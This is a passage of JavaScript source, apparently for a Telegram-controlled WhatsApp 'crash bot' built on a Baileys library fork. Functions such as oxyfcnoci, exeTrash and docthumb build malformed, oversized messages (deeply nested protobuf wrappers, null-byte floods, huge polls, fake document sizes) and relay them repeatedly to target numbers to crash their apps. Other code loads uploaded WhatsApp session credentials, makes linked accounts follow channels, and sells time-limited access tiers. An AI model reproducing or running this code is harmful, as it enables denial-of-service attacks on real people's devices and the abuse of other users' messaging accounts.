    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});

    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});

   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
}

async function oxyfcnoci(sock, target) {
    let locationMessage = {
        degreesLatitude: -9.09999262999,
        degreesLongitude: 199.99963118999,
        jpegThumbnail: null
    };

    const msg = {
        pollCreationMessageV6: {
            name: "𑇂𑆵𑆴𑆿".repeat(50000),
            options: Array.from({ length: 10000 }, (_, i) => ({
                optionName: "Gacor" + i + "ꦾ".repeat(1000),
                optionHash: "Oxy" + i + "ꦾ".repeat(1000)
            })),
            selectableOptionsCount: 1,
            pollType: 0,
            pollContentType: 2,
            hideParticipantName: true,
            allowAddOption: false,
            endTime: 999999999999999999
        }
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02]
    ];

    const payload = proto.Message.encode(
        proto.Message.fromObject({
            protocolMessage: {
                type: 0,
                key: { remoteJid: target, fromMe: true },
                message: {
                    interactiveMessage: {
                        body: { text: "\u0000".repeat(90000) },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "quick_reply", buttonParamsJson: "\x00".repeat(25000) },
                                { name: "quick_reply", buttonParamsJson: "\0".repeat(12878) }
                            ],
                            messageParamsJson: JSON.stringify({
                                displayName: "X",
                                title: "\0".repeat(30000)
                            })
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 4000 }, () => ""),
                            forwardingScore: 9999,
                            isForwarded: true,
                            quotedMessage: {
                                locationMessage: {
                                    degreesLatitude: -999.999,
                                    degreesLongitude: 999.999,
                                    name: "\u0000".repeat(35000),
                                    address: "9¿!!".repeat(40000),
                                    contextInfo: {
                                        mentionedJid: Array.from({ length: 2000 }, () => ""),
                                        forwardingScore: 9999,
                                        isForwarded: true,
                                        buffer1: Buffer.from([0, 0, 0, 1]),
                                        buffer2: Buffer.from([0xff, 0, 0, 0x1d]),
                                        buffer3: Buffer.from([0xff, 0, 0, 0x1e]),
                                        buffer4: Buffer.from([0xff, 0, 0, 0x1f]),
                                        buffer5: Buffer.from([0xff, 0, 0, 0x20])
                                    }
                                }
                            }
                        }
                    }
                }
            }
        })
    ).finish();

    const encodeVarint = function(n) {
        let buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const inflate = function(tag, depth) {
        let buf = payload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    if (!jids.length) throw new Error('error');

    const MAX_BATCH = 5;
    const DELAY_MS = 5000;
    let totalSent = 0;

    for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
        const chunk = jids.slice(offset, offset + MAX_BATCH);
        const isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(r => setTimeout(r, DELAY_MS));
        }

        const idx = Math.floor(offset / MAX_BATCH) + 1;
        const suffix = idx > 1 ? ('-' + idx) : '';
        const msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (let ti = 0; ti < TAGS.length; ti++) {
            const tag = TAGS[ti];
            let payloadResult = null;

            for (let depth = 5000; depth >= 2000 && !payloadResult; depth -= 400) {
                try {
                    const decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payloadResult = decoded;
                } catch (_) {}
            }

            if (!payloadResult) continue;

            await sock.relayMessage('status@broadcast', payloadResult, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(jid => ({
                            tag: 'to',
                            attrs: { jid: jid },
                            content: []
                        }))
                    }]
                }]
            });

            totalSent++;
        }
    }

    if (!totalSent) throw new Error('error');
}

async function exeTrash(sock, target) {
    try {
        const exeTrash = "CRASH".repeat(500000);
        const buttons = [];    
        for (let b = 0; b < 50; b++) {
            buttons.push({
                buttonId: 'btn_' + b,
                buttonText: {
                    displayText: "CRASH " + b
                },
                type: 1
            });
        }
        
        await sock.relayMessage(
            target,
            {
                buttonsMessage: {
                    contentText: "CRASH " + exeTrash.substring(0, 60000),
                    footerText: "CRASH",
                    buttons: buttons,
                    headerType: 1,
                    viewOnce: true
                }
            },
            {
                messageId: null
            }
        ).catch(() => {}); 
    } catch (e) {
        console.log(`❌ exeTrash error: ${e.message}`);
    }
}

async function docthumb(sock, target) {
    try {
        const pnx = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "CRASH HEADER" + "CRASH".repeat(60000),
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "1073741824000000",
                                pageCount: 9007199254740991 * 9999,
                                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                fileName: "CRASH FILE" + "CRASH".repeat(60000),
                                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1723855952",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: "CRASH BODY" + "CRASH".repeat(60000),
                        },
                        contextInfo: {
                            remoteJid: "X",
                            participant: sock.user.id,
                            mentionedJid: [target, "13135550002@s.whatsapp.net"],
                            quotedMessage: {},
                        },
                        nativeFlowMessage: {
                            messageParamsJson: JSON.stringify({}),
                            buttons: [
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "REVIEW",
                                        "flow_cta": "\0" + "CRASH" + "\u0000".repeat(35000),
                                        "flow_message_version": "3"
                                    })
                                },
                            ]
                        }
                    }
                }
            },
            participant: { jid: target }
        };

        const pnxMessage = generateWAMessageFromContent(
            target,
            proto.Message.fromObject(pnx),
            {
                userJid: target
            }
        );
        await sock.relayMessage(target, pnxMessage.message,
            {
                messageId: pnxMessage.key.id
            }
        );
    } catch (err) {
        console.log(`❌ docthumb error: ${err.message}`);
    }
}

const {
  generateMessageIDV2, encodeSignedDeviceIdentity,jidEncode
    
} = require("@sanzope/bails");

const relayMSGCustom = async (sock, target, message) => {
  const authVsP = sock.authState.creds.me.id;
  const meLid = sock.authState.creds.me?.lid;

  const { user: mePN } = jidDecode(authVsP);
  const { user: meLidU } = meLid ? jidDecode(meLid) : { user: null };

  const msgId = generateMessageIDV2(authVsP);
  const ngentodd = jidEncode(jidDecode(meLid)?.user, "lid", undefined);

  const meMsg = {
    deviceSentMessage: {
      destinationJid: target,
      message
    },
    messageContextInfo: message.messageContextInfo
  };

  const VsP = {};

  const mediaTypeVsP =
    message.imageMessage ? "image" : message.videoMessage ? message.videoMessage.gifPlayback ? "gif" : "video" : message.audioMessage ? message.audioMessage.ptt ? "ptt" : "audio" : message.documentMessage ? "document" : message.stickerMessage ? "sticker" : undefined;

  if (mediaTypeVsP) VsP.mediatype = mediaTypeVsP;
  let stanza;
  await sock.authState.keys.transaction(async () => {
    const devices = await sock.getUSyncDevices([ngentodd, target], true, false);
    const meR = [];
    const otR = [];
    for (const { user, jid: dJid } of devices) {
      if (dJid === authVsP || (meLid && dJid === meLid)) continue;
      const isMe = user === mePN || user === meLidU;
      (isMe ? meR : otR).push(dJid);
    }

    const all = [...meR, ...otR];
    await sock.assertSessions(all);
    const [
      { nodes: meN, shouldIncludeDeviceIdentity: s1 },
      { nodes: otN, shouldIncludeDeviceIdentity: s2 }
    ] = await Promise.all([
      sock.createParticipantNodes(meR, {
        conversation: "CRASH"
      }),
      sock.createParticipantNodes(otR, message, VsP, meMsg)
    ]);

    const ahahahk = [
      ...meN.map(n => {
        n.content[0].content = Buffer.from("hello world", "base64");
        return n;
      }),
      ...otN
    ];

    const incDI = s1 || s2;
    stanza = {
      tag: "message",
      attrs: {
        id: msgId,
        to: target,
        type: ["imageMessage", "videoMessage", "audioMessage", "documentMessage", "stickerMessage"].some(k => k in message) ? "media" : "reactionMessage" in message ? "reaction" : "text"
      },
      content: ahahahk.length ? [{ tag: "participants", attrs: {}, content: ahahahk }] : []
    };

    if (incDI) {
      stanza.content.push({
        tag: "device-identity",
        attrs: {},
        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
      });
    }

    await sock.sendNode(stanza);
  }, authVsP);

  return stanza;
};

// ============================================================
// 🔥 WHATSAPP CONNECT LOGIC
// ============================================================

const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function getVipSessionPath(sessionName) {
  return path.join('vip', sessionName);
}

function setupVipFolder() {
  const vipPath = path.join(__dirname, 'vip');
  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';
  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';
    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);
          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }
          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);
          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }
  console.log('Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;
  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }
    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }
    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  await startUserSessions();
}

const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get("https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json");
    const entries = Object.entries(activeConnections);
    if (entries.length === 0) {
      console.log("Tidak ada koneksi aktif untuk unfollow.");
      return;
    }
    
    const sock = entries[0][1];
    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        console.log(`Gagal unfollow ${jid}:`, err.message);
      }
    }
  } catch (error) {
    console.log("Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);
  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();
  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });
  sock.ev.on("creds.update", saveCreds);
  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`Reconnecting ${number} Karena ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        await sock.newsletterFollow("120363404995533206@newsletter");
        await sock.newsletterFollow("120363330344810280@newsletter");
        await sleep(5000);
        await unfollowAllChannel();
        console.log("Auto join channel sukses");
      } catch (e) {
        console.log("Auto join channel gagal");
      }
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);
      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(`Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`Failed to rewrite creds: ${e.message}`);
      }
    }
  });
  return null;
}

async function startUserSessions() {
  const vipDir = 'vip';
  const baseDir = 'permenmd';
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory());
  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);
  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));
      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);
      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;
        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }
        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}

function prepareVipSessionFolders() {
  const vipFolder = 'vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
    }
    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));
    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    console.error("Error preparing VIP folders:", err.message);
    return [];
  }
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectSession('vip', baseName);
  }
}

function getRandomVipConnection() {
  const conns = getActiveVipConnections();
  const keys = Object.keys(conns);
  if (keys.length === 0) return null;
  return conns[keys[Math.floor(Math.random() * keys.length)]];
}

function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
}

function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];
  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }
  return activeSockets;
}

function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

const telegramDataPath = "telegram.json";
const dbPath = "database.json";

function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDevList() {
  if (!fs.existsSync(DEV_FILE)) {
    fs.writeFileSync(DEV_FILE, JSON.stringify({ developers: [] }, null, 2));
  }
  return JSON.parse(fs.readFileSync(DEV_FILE, 'utf8'));
}

function saveDevList(data) {
  fs.writeFileSync(DEV_FILE, JSON.stringify(data, null, 2));
}

function isDeveloper(userId) {
  const config = loadTelegramConfig();
  return config.ownerList.includes(userId);
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `${u.username} | ${getRoleDisplay(u.role || 'member_perhari')} | ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;
  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];
  return requiredKeys.every(key => key in jsonData);
}

// ============================================================
// 🔥 TELEGRAM BOT COMMANDS
// ============================================================

bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;
  if (!isUser) return bot.sendMessage(id, "Akses ditolak. Anda tidak diizinkan menjalankan perintah ini.");
  
  const isDeveloper = isOwner;
  
  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buat Akun Member", callback_data: "create_member" }],
        [{ text: "Set Expired", callback_data: "set_expire" }],
        ...(isDeveloper ? [[
          { text: "List User", callback_data: "list_user" },
          { text: "Buat Custom User", callback_data: "create_custom" },
          { text: "Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };
  bot.sendMessage(id, `Halo ${msg.from.first_name}, pilih menu:`, options);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) return;
    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());
      if (!isValidBaileysCreds(jsonData)) return bot.sendMessage(chatId, "File tersebut bukan creds.json valid dari Baileys.");
      
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) fs.mkdirSync(userFolder, { recursive: true });
      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now();
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }
      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));
      bot.sendMessage(chatId, `File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, 'Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;
  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
  
  const isDeveloper = isOwner;
  
  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: username|password|durasi_hari");
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "Username sudah ada!");
        
        let targetRole = 'member_perhari';
        const dayInt = parseInt(day);
        if (dayInt === 0 || day === 'permanent') {
          targetRole = 'full_up';
        } else if (dayInt >= 30) {
          targetRole = 'member_perbulan';
        } else if (dayInt >= 7) {
          targetRole = 'member_perminggu';
        } else {
          targetRole = 'member_perhari';
        }
        
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ 
          username, 
          password, 
          role: targetRole, 
          expiredDate: day === 'permanent' ? '2099-12-31' : expired.toISOString().split("T")[0],
          createdBy: msg.from.username || 'telegram'
        });
        saveDatabase(db);
        bot.sendMessage(id, `Akun member dibuat: Username: ${username} Password: ${password} Role: ${getRoleDisplay(targetRole)}`);
      });
      break;
    case "set_expire":
      bot.sendMessage(id, "Masukkan: username|tambah_hari");
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "User tidak ditemukan.");
        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);
        
        // Cek level - harus lebih tinggi
        const editorLevel = getRoleLevel(config.ownerList.includes(id) ? 'developers' : 'member');
        const targetLevel = getRoleLevel(user.role);
        if (editorLevel <= targetLevel) {
          return bot.sendMessage(id, `Tidak bisa mengedit user dengan rank lebih tinggi (${getRoleDisplay(user.role)}).`);
        }
        
        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;
    case "list_user":
      if (!isDeveloper && !isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `Daftar Pengguna:\n${users}`);
      break;
    case "create_custom":
      if (!isDeveloper && !isOwner) return;
      bot.sendMessage(id, "Masukkan: username|password|role|durasi_hari");
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "Username sudah ada!");
        
        // Cek role valid
        if (!isValidRole(role)) return bot.sendMessage(id, `Role '${role}' tidak valid.`);
        
        // Cek izin create - TURUN TEMURUN
        const creatorRole = config.ownerList.includes(id) ? 'developers' : 'ceo';
        if (!canCreateRole(creatorRole, role)) {
          return bot.sendMessage(id, `Role '${getRoleDisplay(creatorRole)}' tidak bisa membuat '${getRoleDisplay(role)}'.`);
        }
        
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ 
          username, 
          password, 
          role, 
          expiredDate: day === 'permanent' ? '2099-12-31' : expired.toISOString().split("T")[0],
          createdBy: msg.from.username || 'telegram'
        });
        saveDatabase(db);
        bot.sendMessage(id, `Akun ${getRoleDisplay(role)} dibuat: Username: ${username}`);
      });
      break;
    case "delete_user":
      if (!isDeveloper && !isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const targetUser = db.find(u => u.username === msg.text);
        if (!targetUser) return bot.sendMessage(id, "User tidak ditemukan.");
        
        // Cek level - harus lebih tinggi
        const editorLevel = getRoleLevel('developers');
        const targetLevel = getRoleLevel(targetUser.role);
        if (editorLevel <= targetLevel) {
          return bot.sendMessage(id, `Tidak bisa menghapus user dengan rank lebih tinggi (${getRoleDisplay(targetUser.role)}).`);
        }
        
        // Developers tidak bisa dihapus oleh selain developers
        if (targetUser.role === 'developers') {
          return bot.sendMessage(id, "Hanya Developers yang bisa menghapus Developers.");
        }
        
        const index = db.findIndex(u => u.username === msg.text);
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `User ${deleted.username} (${getRoleDisplay(deleted.role)}) berhasil dihapus.`);
      });
      break;
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isDeveloper = config.ownerList.includes(id) || id === OWNER_ID;
  if (!isDeveloper) return bot.sendMessage(chatId, "Akses ditolak. Anda tidak diizinkan menjalankan perintah ini.");
  try {
    if (!fs.existsSync(SESSION_PATH)) return bot.sendMessage(chatId, "Folder 'permenmd' tidak ditemukan.");
    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);
    for (const userFolder of userFolders) {
